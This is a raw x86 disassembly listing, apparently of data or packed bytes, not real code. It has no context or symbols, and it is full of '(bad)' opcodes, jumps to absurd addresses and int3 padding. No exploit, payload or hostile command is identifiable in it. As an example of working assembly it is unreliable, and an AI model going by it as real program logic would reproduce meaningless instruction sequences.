  420c41:	test   DWORD PTR [eax],eax
  420c43:	xor    DWORD PTR [ebp-0x3c],0x0
  420c47:	(bad)  
  420c48:	cld    
  420c49:	xor    al,0x0
  420c4b:	adc    ebx,0x7
  420c4e:	cmp    edi,0x4a
  420c51:	in     eax,dx
  420c52:	mov    DWORD PTR [eax],eax
  420c54:	aas    
  420c55:	mov    cl,ah
  420c57:	cmp    DWORD PTR [edi+0x7d],0xffffffcc
  420c5b:	add    BYTE PTR [eax],cl
  420c5d:	aaa    
  420c5e:	add    ah,cl
  420c60:	xor    BYTE PTR [esp+ecx*8+0x0],bh
  420c64:	inc    ecx
  420c65:	or     eax,0x70a88900
  420c6a:	inc    DWORD PTR [eax]
  420c6c:	mov    al,ds:0x7683ffcc
  420c71:	retf   
  420c72:	add    BYTE PTR [eax],al
  420c74:	inc    edx
  420c75:	mov    dh,0xff
  420c77:	inc    DWORD PTR ds:0xc7ccffc0
  420c7d:	das    
  420c7e:	inc    DWORD PTR [eax]
  420c80:	ss push ss
  420c82:	inc    DWORD PTR [ebx-0x7600f59a]
  420c88:	aaa    
  420c89:	sub    eax,0x43e3ffff
  420c8e:	add    BYTE PTR [ecx-0x7c00a046],cl
  420c94:	push   0xffffff8d
  420c96:	add    DWORD PTR [eax],0xffffff8e
  420c99:	jb     0x420c9a
  420c9b:	add    dl,dl
  420c9d:	push   eax
  420c9e:	add    bh,bh
  420ca0:	test   al,0x98
  420ca2:	add    ah,cl
  420ca4:	in     eax,0x33
  420ca6:	add    BYTE PTR [eax],al
  420ca8:	adc    eax,0x2583ffc2
  420cad:	inc    ecx
  420cae:	inc    DWORD PTR [ebx+0xff9904]
  420cb4:	jno    0x420cf2
  420cb6:	inc    DWORD PTR [eax]
  420cb8:	adc    BYTE PTR [ebx],al
  420cba:	(bad)  
  420cbb:	inc    esp
  420cbd:	fadd   QWORD PTR [eax]
  420cbf:	adc    DWORD PTR [ebx-0x79],0xffffff83
  420cc3:	jmp    DWORD PTR [ebx+edx*2+0x9c000ff]
  420cca:	dec    DWORD PTR [ecx+0xff5321]
  420cd0:	or     eax,0xae00ff91
  420cd5:	xor    eax,DWORD PTR [eax]
  420cd7:	inc    DWORD PTR [edi]
  420cd9:	test   DWORD PTR [ecx-0xac777d],ecx
  420cdf:	(bad)  
  420ce0:	faddp  st(6),st
  420ce2:	(bad)  
  420ce3:	inc    edx
  420ce5:	mov    ch,0xff
  420ce7:	jmp    FWORD PTR [edi+0x800ff8a]
  420ced:	xchg   ebp,eax
  420cee:	or     esp,0xffffffd9
  420cf1:	add    BYTE PTR [eax],0x83
  420cf4:	push   edi
  420cf5:	cs (bad) 
  420cf7:	(bad)  
  420cf8:	(bad)  
  420cfa:	int3   
  420cfb:	add    BYTE PTR [edx-0xc007ce0],ch
  420d01:	mov    DWORD PTR [eax],0xff6d2bcc
  420d07:	add    cl,dh
  420d09:	ins    BYTE PTR es:[edi],dx
  420d0a:	add    bh,bh
  420d0c:	push   edx
  420d0d:	loopne 0x420d0e
  420d0f:	call   FWORD PTR [edx+0xc00ffb0]
  420d15:	xchg   esi,eax
  420d16:	mov    DWORD PTR [eax],eax
  420d18:	int3   
  420d19:	int3   
  420d1a:	int3   
  420d1b:	int3   
  420d1c:	int3   
  420d1d:	int3   
  420d1e:	int3   
  420d1f:	int3   
  420d20:	fs (bad) 
  420d22:	mov    eax,0xffff64
  420d27:	push   edi
  420d28:	xchg   BYTE PTR [eax],al
  420d2a:	adc    DWORD PTR [eax+0x0],ecx
  420d2d:	add    BYTE PTR [ebx+0xdff49bc],al
  420d33:	hlt    
  420d34:	dec    esp
  420d36:	sub    DWORD PTR [ebx-0x6413330b],0xffffff83
  420d3d:	add    bh,bh
  420d3f:	sbb    dl,bh
  420d41:	(bad)  
  420d42:	cmp    bh,al
  420d44:	dec    DWORD PTR [ecx+0xccbbff]
  420d4a:	loopne 0x420da5
  420d4c:	cmp    edi,0xffffffff
  420d4f:	xchg   edx,eax
  420d50:	popa   
  420d51:	add    BYTE PTR [ebx+0x8389a4],dh
  420d57:	and    DWORD PTR [ecx-0x5bc634],edx
  420d5d:	add    BYTE PTR [eax],al
  420d5f:	adc    ecx,DWORD PTR [ebx]
  420d61:	add    BYTE PTR [eax-0x13],cl
  420d64:	int3   
  420d65:	(bad)  
  420d66:	(bad)  
  420d67:	cmp    eax,0xef98897b
  420d6c:	cmp    edi,0xffffffff
  420d6f:	cmc    
  420d70:	sbb    edi,edi
  420d72:	aas    
  420d73:	sbb    bh,bh
  420d75:	(bad)  
  420d76:	(bad)  
  420d77:	mov    esp,0x6238fff2
  420d7c:	add    BYTE PTR [eax],al
  420d7e:	jmp    DWORD PTR [edx-0x58]
  420d81:	dec    DWORD PTR [edx-0x3300ef]
  420d87:	xor    cl,dl
  420d89:	add    cl,dh
  420d8b:	fwait
  420d8c:	int3   
  420d8d:	inc    DWORD PTR [eax]
  420d8f:	aaa    
  420d90:	add    eax,DWORD PTR [eax]
  420d92:	nop
  420d93:	clc    
  420d94:	add    BYTE PTR [eax],al
  420d96:	push   DWORD PTR [edi]
  420d98:	pop    edi
  420d99:	add    bh,ah
  420d9b:	ins    DWORD PTR es:[edi],dx
  420d9c:	(bad)  
  420d9d:	inc    DWORD PTR [eax]
  420d9f:	out    dx,al
  420da0:	xchg   ebx,eax
  420da1:	dec    DWORD PTR [edx-0xff335b]
  420da7:	ds mov ecx,0xffbc47ff
  420dad:	(bad)  
  420dae:	(bad)  
  420daf:	std    
  420db0:	pop    edi
  420db1:	call   DWORD PTR [esi-0x7cff7cd5]
  420db7:	ret    
  420db8:	enter  0xebff,0xa6
  420dbc:	add    BYTE PTR [eax],al
  420dbe:	jmp    FWORD PTR ds:0xec70ccd5
  420dc4:	dec    esp
  420dc6:	jmp    FWORD PTR [eax+0x62]
  420dc9:	add    ecx,0x47
  420dcc:	inc    DWORD PTR [eax]
  420dce:	jmp    DWORD PTR [eax+ebp*2+0x0]
  420dd2:	daa    
  420dd3:	pop    ebx
  420dd4:	mov    DWORD PTR [eax],eax
  420dd6:	dec    ebx
  420dd8:	rol    DWORD PTR [eax],cl
  420dda:	pop    ebx
  420ddb:	sbb    al,0xff
  420ddd:	add    BYTE PTR [ebx+0x3200c000],al
  420de3:	adc    BYTE PTR [ecx-0x1cec0000],cl
  420de9:	push   esi
  420deb:	scas   al,BYTE PTR es:[edi]
  420dec:	int3   
  420ded:	int3   
  420dee:	call   FWORD PTR [esi]
  420df0:	mov    esi,0xff6dc200
  420df5:	cmp    edi,0x3b
  420df8:	push   cs
  420df9:	push   DWORD PTR [eax-0x7c0000da]
  420dff:	jp     0x420dfa
  420e01:	add    BYTE PTR ds:0xccff0003,bl
  420e07:	mov    bh,0x29
  420e09:	(bad)  
  420e0a:	fidivr DWORD PTR [ebx]
  420e0c:	int3   
  420e0d:	mov    DWORD PTR [eax],eax
  420e0f:	stos   DWORD PTR es:[edi],eax
  420e10:	sbb    al,BYTE PTR [eax]
  420e12:	mov    WORD PTR [edx-0x7f000077],cs
  420e18:	aad    0x0
  420e1a:	xor    BYTE PTR [esi],dh
  420e1c:	add    BYTE PTR [eax],al
  420e1e:	int3   
  420e1f:	cs mov edx,0x8332b3ff
  420e25:	(bad)  
  420e26:	(bad)  
  420e27:	mov    eax,0x8b06ff86
  420e2c:	add    DWORD PTR [eax],0x0
  420e2f:	cmc    
  420e30:	loopne 0x420e32
  420e32:	sbb    al,0xca
  420e34:	add    bh,bh
  420e36:	(bad)  
  420e37:	mov    ebp,0xf0a900cc
  420e3c:	dec    esp
  420e3e:	int3   
  420e3f:	and    eax,0xe42b003a
  420e44:	(bad)  
  420e45:	inc    DWORD PTR [eax]
  420e47:	sbb    BYTE PTR [ebp+0xaa13ff],0x0
  420e4e:	add    BYTE PTR [edi+eiz*2-0x7ced0d77],cl
  420e55:	(bad)  
  420e56:	(bad)  
  420e57:	jge    0x420e1f
  420e59:	(bad)  
  420e5a:	fadd   DWORD PTR [ebp-0x8000034]
  420e60:	popf   
  420e61:	mov    DWORD PTR [eax+0xff001c],eax
  420e67:	outs   dx,DWORD PTR ds:[esi]
  420e68:	pop    ds
  420e69:	(bad)  
  420e6a:	fadd   QWORD PTR ds:0x4a89ffff
  420e70:	fwait
  420e71:	(bad)  
  420e72:	mov    edi,0xffff0012
  420e77:	and    al,0x4
  420e79:	(bad)  
  420e7a:	mov    ebp,0xffffc1
  420e7f:	sbb    eax,0xae9ff97
  420e84:	mov    DWORD PTR [ecx+0xa35bff],ecx
  420e8a:	xor    ebp,DWORD PTR [ecx-0x49ff7d00]
  420e90:	sbb    al,BYTE PTR [ebx-0xd978]
  420e96:	add    BYTE PTR [eax+0xa9aff7b],al
  420e9c:	inc    DWORD PTR [eax]
  420e9e:	call   FWORD PTR [ecx+0x7f]
  420ea1:	dec    DWORD PTR [edx]
  420ea3:	idiv   edi
  420ea5:	(bad)  
  420ea6:	dec    DWORD PTR [ebx-0x5d4600d9]
  420eac:	inc    DWORD PTR [eax]
  420eae:	mov    DWORD PTR [eax+0x75],eax
  420eb1:	sbb    DWORD PTR [ecx+0x42],0xffffffff
  420eb5:	inc    DWORD PTR [eax]
  420eb7:	cmp    DWORD PTR [ebx-0x1],ecx
  420eba:	fwait
  420ebb:	dec    esi
  420ebc:	(bad)  
  420ebd:	(bad)  
  420ebe:	call   FWORD PTR [esi+ecx*2-0x33e87000]
  420ec5:	(bad)  
  420ec6:	jmp    DWORD PTR [ebx-0x2c0c7604]
  420ecc:	add    bh,bh
  420ece:	jmp    DWORD PTR [ecx-0x79]
  420ed1:	int3   
  420ed2:	push   esi
  420ed3:	dec    edx
  420ed4:	int3   
  420ed5:	inc    DWORD PTR [ebx-0x7000b44d]
  420edb:	xchg   DWORD PTR [ebx-0x7e537700],eax
  420ee1:	int3   
  420ee2:	jo     0x420f27
  420ee4:	cmp    edi,0xffffff83
  420ee7:	push   es
  420ee8:	addr16 jmp ebp
  420eeb:	pop    ss
  420eec:	(bad)  
  420eed:	inc    DWORD PTR [eax]
  420eef:	shr    BYTE PTR ds:0x898c8683,1
  420ef5:	(bad)  
  420ef6:	push   DWORD PTR [eax-0x310c7c49]
  420efc:	add    BYTE PTR [eax],al
  420efe:	jmp    DWORD PTR [ebx]
  420f00:	mov    al,0x0
  420f02:	pop    ss
  420f03:	addr16 int3 
  420f05:	add    BYTE PTR [ecx-0x6900a408],cl
  420f0b:	sbb    eax,0x400ff00
  420f10:	add    al,0xff
  420f12:	fwait
  420f13:	mov    edi,edi
  420f15:	add    bh,bh
  420f17:	jmp    0xfe1f0e86
  420f1c:	int3   
  420f1d:	inc    DWORD PTR [ebx-0x6800e5a7]
  420f23:	je     0x420f25
  420f25:	int3   
  420f26:	and    eax,0xffffffeb
  420f29:	call   DWORD PTR [edx+ebp*2-0x7d]
  420f2d:	(bad)  
  420f2e:	jmp    FWORD PTR [edx+0x33fb003c]
  420f34:	int3   
  420f35:	dec    DWORD PTR [ecx-0x44006dcb]
  420f3b:	test   al,0xff
  420f3d:	(bad)  
  420f3e:	(bad)  
  420f3f:	jp     0x420f84
  420f41:	call   FWORD PTR [ecx]
  420f43:	(bad)  
  420f44:	(bad)  
  420f45:	(bad)  
  420f46:	push   DWORD PTR [esi-0x46]
  420f49:	jmp    DWORD PTR [edi-0x6b]
  420f4c:	add    BYTE PTR [eax],al
  420f4e:	add    edi,0x36
  420f51:	cmp    eax,0xffffff97
  420f54:	(bad)  
  420f55:	(bad)  
  420f56:	jmp    DWORD PTR [eax+eax*8]
  420f59:	add    dh,dl
  420f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f5c:	int3   
  420f5d:	or     esp,0xffffff99
  420f60:	pop    ss
  420f61:	call   DWORD PTR [edx]
  420f63:	retf   0x8383
  420f66:	push   DWORD PTR [edx+0x1808fffe]
  420f6c:	(bad)  
  420f6d:	(bad)  
  420f6e:	call   FWORD PTR [eax+eax*1+0x8fc0ff]
  420f75:	inc    DWORD PTR [eax]
  420f77:	dec    ebx
  420f78:	inc    eax
  420f79:	int3   
  420f7a:	cwde   
  420f7b:	ret    0xff
  420f7e:	add    dl,dh
  420f80:	in     al,dx
  420f81:	dec    DWORD PTR [esi+0x14]
  420f84:	cmp    edi,0xffffffff
  420f87:	jl     0x420f6a
  420f89:	inc    esi
  420f8b:	cmp    eax,DWORD PTR [eax]
  420f8d:	int3   
  420f8e:	inc    DWORD PTR [eax]
  420f90:	je     0x420f92
  420f92:	stos   BYTE PTR es:[edi],al
  420f93:	sahf   
  420f94:	dec    esp
  420f96:	mov    ebx,ecx
  420f98:	ret    
  420f99:	add    ch,ch
  420f9b:	test   DWORD PTR [eax],eax
  420f9d:	add    DWORD PTR [ebx+0x6683f47b],0xffffffc8
  420fa4:	mov    DWORD PTR [ebx-0x7cb93300],eax
  420faa:	pop    es
  420fab:	stos   BYTE PTR es:[edi],al
  420fac:	add    BYTE PTR [ebx-0x76217b77],al
  420fb2:	mov    ds:0x838904,al
  420fb7:	mov    al,0xdb
  420fb9:	jmp    esi
  420fbb:	push   ecx
  420fbc:	mov    DWORD PTR [eax],eax
  420fbe:	jmp    DWORD PTR [edx]
  420fc0:	je     0x420fc2
  420fc2:	dec    esp
  420fc3:	adc    al,0x0
  420fc5:	add    bh,bh
  420fc7:	nop
  420fc8:	je     0x420fca
  420fca:	push   es
  420fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fcc:	add    BYTE PTR [eax],al
  420fce:	mov    DWORD PTR [esi+0x4954fff1],esi
  420fd4:	inc    DWORD PTR [eax]
  420fd6:	jmp    FWORD PTR [ebx-0x5d]
  420fd9:	push   edx
  420fdb:	pop    ds
  420fdc:	add    bh,bh
  420fde:	add    BYTE PTR [edi],ch
  420fe0:	cmc    
  420fe1:	int3   
  420fe2:	xor    ebp,DWORD PTR [edx-0x34]
  420fe5:	(bad)  
  420fe6:	(bad)  
  420fe7:	ds jne 0x420fea
  420fea:	addr16 dec ebx
  420fec:	add    BYTE PTR [ebx-0x722c00],al
  420ff2:	dec    esp
  420ff3:	inc    esi
  420ff4:	add    BYTE PTR [eax],al
  420ff6:	inc    DWORD PTR [esp+edi*1-0xd3b334]
  420ffd:	or     DWORD PTR [ecx+0x3e83eeb2],0x6b
  421004:	add    BYTE PTR [eax],al
  421006:	push   ecx
  421008:	jmp    0x421009
  42100a:	in     al,dx
  42100b:	dec    esp
  42100d:	add    DWORD PTR [eax],0x5b
  421010:	scas   al,BYTE PTR es:[edi]
  421011:	jmp    FWORD PTR [ecx]
  421013:	out    0xff,eax
  421015:	inc    DWORD PTR [eax]
  421017:	pop    ebx
  421018:	or     al,BYTE PTR [eax]
  42101a:	dec    ebx
  42101b:	push   es
  42101c:	inc    DWORD PTR [eax]
  42101e:	call   DWORD PTR [edi+eax*8+0x0]
  421022:	lods   al,BYTE PTR ds:[esi]
  421023:	mov    al,ds:0x5c83ffff
  421028:	fdivp  st(7),st
  42102a:	imul   ebp,DWORD PTR [ebx+eax*4-0x1],0xffffffcc
  42102f:	jl     0x420fd1
  421031:	add    DWORD PTR [eax-0x7e],0xffffff83
  421035:	int3   
  421036:	add    BYTE PTR [edx+0x6b37ccd7],al
  42103c:	inc    DWORD PTR [eax]
  42103e:	add    al,bl
  421040:	pushf  
  421041:	(bad)  
  421042:	mov    esi,0x830082
  421047:	xor    al,0xd4
  421049:	dec    DWORD PTR [eax]
  42104b:	mov    ds:0x84ff00ff,al
  421050:	or     eax,DWORD PTR [eax]
  421052:	inc    esp
  421053:	jl     0x421054
  421055:	int3   
  421056:	add    dh,ah
  421058:	jnp    0x421059
  42105a:	ss pop ecx
  42105c:	inc    DWORD PTR [eax]
  42105e:	jmp    FWORD PTR [edi]
  421060:	adc    ah,cl
  421062:	(bad)
  421066:	add    bh,al
  421068:	cmp    edi,0xffffffd9
  42106b:	cld    
  42106c:	add    BYTE PTR [eax],al
  42106e:	mov    DWORD PTR [edi],ebx
  421070:	jb     0x421071
  421072:	or     eax,0x89cc831b
  421077:	dec    edx
  421078:	mov    eax,0x161100
  42107d:	(bad)  
  42107e:	jmp    DWORD PTR [edx-0x41d700a2]
  421084:	mov    edi,edi
  421086:	jmp    DWORD PTR [ebp+0x11]
  421089:	inc    DWORD PTR [eax-0x7cff76df]
  42108f:	ja     0x421039
  421091:	dec    DWORD PTR [ebp+0x83fff1]
  421097:	ins    BYTE PTR es:[edi],dx
  421098:	mov    bl,0xff
  42109a:	and    BYTE PTR [ecx],bh
  42109c:	inc    DWORD PTR [eax]
  42109e:	add    dh,dl
  4210a0:	xchg   bh,bh
  4210a2:	pusha  
  4210a3:	dec    ebp
  4210a4:	dec    esp
  4210a6:	add    BYTE PTR [eax+0x6e],bh
  4210a9:	call   FWORD PTR [ebx]
  4210ab:	lods   eax,DWORD PTR ds:[esi]
  4210ac:	inc    DWORD PTR [ebx-0x33b07500]
  4210b2:	pop    ecx
  4210b3:	pushf  
  4210b4:	add    DWORD PTR [ebx+0x9608ff],0xfffffffd
  4210bb:	enter  0xff,0x83
  4210bf:	frstor [esi]
  4210c1:	mov    edi,ebx
  4210c3:	loope  0x4210c4
  4210c5:	int3   
  4210c6:	sub    DWORD PTR ds:0x63298932,0xffffffff
  4210cd:	inc    DWORD PTR [ebx+0x66005f24]
  4210d3:	adc    al,0xff
  4210d5:	mov    edi,edi
  4210d7:	inc    edi
  4210d8:	inc    eax
  4210d9:	sub    edi,0xffffffa7
  4210dc:	add    bh,bh
  4210de:	dec    DWORD PTR [edx+0x48460027]
  4210e4:	cmp    edi,0xffffff89
  4210e7:	dec    esp
  4210e8:	test   DWORD PTR [eax],0xffcc576d
  4210ee:	add    ch,dl
  4210f0:	add    eax,0xff67ab00
  4210f5:	mov    edi,edi
  4210f7:	push   0xffffffa9
  4210f9:	inc    DWORD PTR ds:0xff000085
  4210ff:	sbb    cl,BYTE PTR [eax+eax*1-0x5fa3]
  421106:	jmp    FWORD PTR [edx-0x6061ffd0]
  42110c:	add    DWORD PTR [eax],0xffffffff
  42110f:	xchg   ebx,eax
  421110:	add    BYTE PTR ss:[edx],cl
  421113:	fdivp  st(7),st
  421115:	inc    DWORD PTR [eax]
  421117:	mov    eax,ds:0x276b0069
  42111c:	int3   
  42111d:	mov    DWORD PTR [ebx-0x38767625],eax
  421123:	adc    al,0x89
  421125:	dec    DWORD PTR [ecx-0x5c7cbddf]
  42112b:	mov    dl,0xff
  42112d:	(bad)  
  42112e:	(bad)  
  42112f:	cmp    bh,BYTE PTR [eax+0x0]
  421132:	fst    QWORD PTR [edi+edi*8-0x31257d00]
  421139:	add    BYTE PTR [ebx],dl
  42113b:	add    BYTE PTR [ebx-0xd170077],0x0
  421142:	and    al,0x84
  421144:	add    bh,bh
  421146:	add    BYTE PTR [esp+ecx*8-0x7d],al
  42114a:	out    dx,al
  42114b:	repnz (bad) 
  42114d:	(bad)  
  42114e:	(bad)  
  42114f:	mov    edx,0x409effe4
  421154:	(bad)  
  421155:	inc    DWORD PTR [ebx+0x398970da]
  42115b:	cmp    DWORD PTR [eax],eax
  42115d:	add    BYTE PTR [ebx-0x77ff5874],al
  421163:	sub    eax,0x71ff00ff
  421168:	push   0xff4cb1ff
  42116d:	inc    DWORD PTR [ebx-0x60ff19ea]
  421173:	pop    edx
  421174:	inc    DWORD PTR [ebx+0x2f3583]
  42117a:	into   
  42117b:	cmp    eax,0x5000ccff
  421180:	pop    eax
  421181:	jmp    FWORD PTR [esi+0x77]
  421184:	or     esp,0xffffffff
  421187:	mov    cl,dh
  421189:	jmp    ecx
  42118b:	stos   BYTE PTR es:[edi],al
  42118c:	(bad)  
  42118d:	(bad)  
  42118e:	dec    DWORD PTR [ebx+0x6d]
  421191:	push   edi
  421193:	xor    eax,0xd500ff89
  421198:	ins    BYTE PTR es:[edi],dx
  421199:	jmp    DWORD PTR [edx+0x53]
  42119c:	add    BYTE PTR [eax],al
  42119e:	or     DWORD PTR [edi-0x69a100c9],0xffffffff
  4211a5:	(bad)  
  4211a6:	(bad)  
  4211a7:	cmp    esp,esi
  4211a9:	add    BYTE PTR [edi],dh
  4211ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ac:	mov    DWORD PTR [eax],eax
  4211ae:	int3   
  4211af:	inc    ebp
  4211b0:	clc    
  4211b1:	mov    DWORD PTR [eax-0x7cff0049],esp
  4211b7:	push   edx
  4211b8:	stos   DWORD PTR es:[edi],eax
  4211b9:	add    dl,cl
  4211bb:	sub    al,0xcc
  4211bd:	mov    DWORD PTR [ebx+0x77ffd4d2],eax
  4211c3:	push   eax
  4211c4:	dec    DWORD PTR [ecx-0x102c01]
  4211ca:	(bad)  
  4211cb:	mov    ebx,0xc1ff8900
  4211d0:	arpl   WORD PTR [eax],ax
  4211d2:	cld    
  4211d3:	pop    ds
  4211d4:	add    BYTE PTR [eax],al
  4211d6:	or     DWORD PTR [eax+0x7f],0xffffffff
  4211da:	xchg   edi,eax
  4211db:	fld    QWORD PTR [ebx+0x1c6b00ff]
  4211e1:	jmp    DWORD PTR [edx]
  4211e3:	ja     0x4211e5
  4211e5:	mov    DWORD PTR [ebx+0xbcc9942],eax
  4211eb:	push   esp
  4211ec:	mov    DWORD PTR [eax],eax
  4211ee:	inc    DWORD PTR [edx-0x620ff6d]
  4211f4:	(bad)  
  4211f5:	(bad)  
  4211f6:	jmp    DWORD PTR [eax]
  4211f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211f9:	add    dl,al
  4211fb:	ds dec esp
  4211fe:	mov    esp,eax
  421200:	es (bad) 
  421202:	out    dx,al
  421203:	jmp    0x89b7:0xaeff0000
  42120a:	xor    DWORD PTR [edi+edi*8],0x0
  42120e:	push   edi
  421210:	mov    dl,0xff
  421212:	pop    es
  421213:	inc    ecx
  421214:	dec    esp
  421216:	(bad)  
  421217:	cmp    BYTE PTR [eax],bh
  421219:	add    DWORD PTR [eax+0x4],0x0
  42121d:	inc    DWORD PTR [eax]
  42121f:	call   FWORD PTR [eax-0x76776100]
  421225:	cmp    edi,0x50
  421228:	mov    al,0x0
  42122a:	cmp    bl,BYTE PTR [ebx]
  42122c:	dec    esp
  42122e:	dec    DWORD PTR [esi+0x7b]
  421231:	sbb    ecx,0x51
  421234:	(bad)  
  421235:	dec    esp
  421237:	fisttp DWORD PTR [esi-0x76bf1200]
  42123d:	add    BYTE PTR [eax],al
  42123f:	pop    ss
  421240:	arpl   WORD PTR [eax],ax
  421242:	jb     0x4212a9
  421244:	int3   
  421245:	inc    DWORD PTR [eax]
  421247:	pop    ss
  421248:	mov    bl,0xcc
  42124a:	fimul  WORD PTR [ebx-0x687d0000]
  421250:	dec    edx
  421251:	dec    DWORD PTR [ebp+0xff0084]
  421257:	fdivr  st(6),st
  421259:	push   DWORD PTR [ebp-0xffffa4]
  42125f:	add    DWORD PTR [esi+0xf2c983],ebp
  421265:	(bad)  
  421266:	dec    DWORD PTR [eax]
  421268:	inc    ecx
  421269:	add    BYTE PTR [esi],cl
  42126b:	sub    eax,0xb600ff89
  421270:	cs (bad) 
  421272:	out    dx,eax
  421273:	jecxz  0x4211fe
  421275:	inc    DWORD PTR [eax]
  421277:	inc    ecx
  421278:	lods   eax,DWORD PTR ds:[esi]
  421279:	dec    DWORD PTR [edi]
  42127b:	add    DWORD PTR [ebx-0xeb40000],0x0
  421282:	push   esi
  421283:	cdq    
  421284:	dec    DWORD PTR [ecx-0xe03200]
  42128a:	fs aad 0x0
  42128d:	add    BYTE PTR [eax],al
  42128f:	jnp    0x4212f6
  421291:	mov    DWORD PTR [edi-0x7cff0048],edx
  421297:	xor    ch,BYTE PTR [esi]
  421299:	(bad)  
  42129a:	js     0x4212cd
  42129c:	dec    esp
  42129e:	dec    DWORD PTR [esi+0x72e0ff65]
  4212a4:	add    DWORD PTR [eax],0x0
  4212a7:	mov    WORD PTR [edi+0x0],fs
  4212aa:	jg     0x4212fa
  4212ac:	(bad)  
  4212ad:	inc    DWORD PTR [ebx+0x5009f36]
  4212b3:	inc    ebp
  4212b4:	mov    DWORD PTR [ecx-0x7c53c701],ecx
  4212ba:	cmp    eax,0x8300f7
  4212bf:	popa   
  4212c0:	or     al,0xff
  4212c2:	(bad)  
  4212c3:	mov    ah,0x0
  4212c5:	add    bh,bh
  4212c7:	pop    ss
  4212c8:	test   DWORD PTR [eax],eax
  4212ca:	push   ebp
  4212cb:	jbe    0x4212cd
  4212cd:	inc    DWORD PTR [ebx-0x4c0072d8]
  4212d3:	test   ah,cl
  4212d5:	add    bh,bh
  4212d7:	out    0x52,eax
  4212d9:	inc    DWORD PTR [edi]
  4212db:	add    bh,bh
  4212dd:	int3   
  4212de:	add    BYTE PTR [eax],ah
  4212e0:	jmp    0x83939c6e
  4212e5:	add    BYTE PTR [eax],al
  4212e7:	sbb    edi,eax
  4212e9:	mov    DWORD PTR [ebx],edi
  4212eb:	enter  0xff83,0xcc
  4212ef:	adc    DWORD PTR [edx-0xc7397d],ecx
  4212f5:	cmp    edi,0xffffffdb
  4212f8:	and    eax,DWORD PTR [eax]
  4212fa:	pop    es
  4212fb:	mov    cs,WORD PTR [ecx+0x460bcc83]
  421301:	call   DWORD PTR [edi+0x83cc0e]
  421307:	push   0xffffff88
  421309:	(bad)  
  42130a:	mov    ebx,0xffffba
  42130f:	out    0x93,eax
  421311:	inc    eax
  421313:	xchg   esp,ecx
  421315:	add    BYTE PTR [eax],al
  421317:	lea    esi,[edi-0xc55a01]
  42131d:	mov    DWORD PTR [ebx-0x5e00432f],eax
  421323:	xchg   esp,eax
  421324:	(bad)  
  421325:	inc    DWORD PTR [ebx-0x22003d3c]
  42132b:	inc    ebp
  42132c:	int3   
  42132d:	(bad)  
  42132e:	call   ebp
  421330:	cmp    eax,0xb98c00
  421335:	inc    DWORD PTR [eax]
  421337:	sbb    ch,al
  421339:	mov    ebx,ecx
  42133b:	push   cs
  42133c:	int3   
  42133d:	add    BYTE PTR [ebx+0x5cff3b03],al
  421343:	jns    0x421311
  421345:	add    BYTE PTR [eax],al
  421347:	or     ch,BYTE PTR [ecx]
  421349:	push   DWORD PTR [eax]
  42134b:	(bad)  
  42134c:	dec    esp
  42134e:	jmp    FWORD PTR [edx+0x603fff24]
  421354:	dec    DWORD PTR [ecx-0xf6f100]
  42135a:	fild   QWORD PTR [esi]
  42135c:	inc    DWORD PTR [ebx-0x2a1001]
  421362:	call   0x142130e
  421367:	dec    esi
  421368:	call   0xffff:0xff0a03ff
  42136f:	sub    al,0xc
  421371:	add    BYTE PTR [edx+ecx*8+0x72008300],dh
  421378:	std    
  421379:	inc    edi
  42137b:	mov    ds:0xc0ffffff,eax
  421380:	add    al,0x0
  421382:	dec    esp
  421383:	cmp    al,BYTE PTR [ebx+0x6b2dffff]
  421389:	inc    ebx
  42138b:	cld    
  42138c:	(bad)  
  42138d:	inc    DWORD PTR [eax]
  42138f:	ret    0xa
  421392:	adc    DWORD PTR [esi-0x56000001],eax
  421398:	adc    al,BYTE PTR [ebx-0xed78]
  42139e:	(bad)  
  42139f:	mov    esi,0xca62ccc8
  4213a4:	add    BYTE PTR [eax],al
  4213a6:	dec    edx
  4213a8:	scas   eax,DWORD PTR es:[edi]
  4213a9:	dec    edi
  4213ab:	imul   ecx,esp,0xffffffff
  4213ae:	inc    DWORD PTR [edx+0x52]
  4213b1:	call   DWORD PTR [esi-0x7600ffb0]
  4213b7:	gs mov cl,0xcc
  4213ba:	push   ebp
  4213bb:	lahf   
  4213bc:	(bad)  
  4213bd:	inc    DWORD PTR [eax]
  4213bf:	adc    ebp,DWORD PTR [ecx+ecx*4]
  4213c2:	pop    es
  4213c3:	push   cs
  4213c4:	inc    DWORD PTR [eax]
  4213c6:	inc    DWORD PTR [ecx-0x8]
  4213c9:	(bad)  
  4213ca:	fisub  WORD PTR [edi+edi*8]
  4213cd:	int3   
  4213ce:	add    BYTE PTR [esi+0x77],al
  4213d1:	add    BYTE PTR [ebp-0x29],ch
  4213d4:	add    BYTE PTR [eax],al
  4213d6:	add    BYTE PTR [eax+0x79ff0098],bh
  4213dc:	(bad)  
  4213dd:	inc    DWORD PTR [eax]
  4213df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e0:	pop    edi
  4213e1:	call   FWORD PTR [eax-0x7600ff4a]
  4213e7:	xor    BYTE PTR [edx-0x1],dl
  4213ea:	outs   dx,BYTE PTR ds:[esi]
  4213eb:	cs cmp edi,0x0
  4213ef:	push   esi
  4213f0:	add    edi,edi
  4213f2:	rcl    DWORD PTR [ecx],0x83
  4213f5:	add    DWORD PTR [ebx+0x6a833423],0xffffffbd
  4213fc:	inc    DWORD PTR [ebx+0xb358ff]
  421402:	mov    ds:0xccffb7,eax
  421407:	jecxz  0x421470
  421409:	mov    DWORD PTR [edi-0x6a],esp
  42140c:	(bad)  
  42140d:	inc    DWORD PTR [eax]
  42140f:	stos   BYTE PTR es:[edi],al
  421410:	cmp    edi,0xff005923
  421416:	dec    edx
  421418:	idiv   bh
  42141a:	(bad)  
  42141b:	sar    edi,cl
  42141d:	add    bh,bh
  42141f:	adc    eax,0xdd658343
  421424:	inc    DWORD PTR [eax]
  421426:	call   DWORD PTR [edi+0x1]
  421429:	cmp    DWORD PTR [edi-0x7c0000ed],0xffffffe1
  421430:	pop    edi
  421431:	add    BYTE PTR [esi],al
  421433:	fild   WORD PTR [ebx+0x27778300]
  421439:	add    dh,ah
  42143b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42143c:	int3   
  42143d:	or     DWORD PTR [ecx-0x3100c5d8],0xffffff9a
  421444:	(bad)  
  421445:	(bad)  
  421446:	jmp    DWORD PTR [edi+edi*2]
  421449:	jmp    DWORD PTR [edi]
